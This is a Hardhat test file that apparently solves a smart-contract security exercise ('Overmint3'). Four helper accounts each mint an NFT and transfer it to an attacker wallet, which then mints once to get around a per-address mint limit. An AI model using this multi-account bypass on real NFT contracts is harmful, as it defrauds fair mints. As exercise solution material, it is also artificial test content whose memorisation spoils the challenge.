const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Overmint3"

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet,plusAddress1,plusAddress2,plusAddress3,plusAddress4] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy();

        return { owner,victimContract, attackerWallet, plusAddress1,plusAddress2,plusAddress3,plusAddress4 };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ owner,victimContract, attackerWallet,plusAddress1,plusAddress2,plusAddress3,plusAddress4 } = await loadFixture(setup));
        })

        // Use another four address mint one NFT and than transfer victimContract adress, meanwhile victimContract also mint one NFT
        it("conduct your attack here", async function () {
            const plusAddresses = [plusAddress1,plusAddress2,plusAddress3,plusAddress4]; 
            for(const index in plusAddresses){
                await victimContract.connect(plusAddresses[index]).mint();
                await victimContract.connect(plusAddresses[index]).transferFrom(plusAddresses[index].address,attackerWallet.address, parseInt(index)+1);// tokenId increased by one each time
            }
            await victimContract.connect(attackerWallet).mint();

        });

        after(async function () {
            expect(await victimContract.balanceOf(attackerWallet.address)).to.be.equal(5);
            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.equal(1, "must exploit one transaction");
        });
    });
});
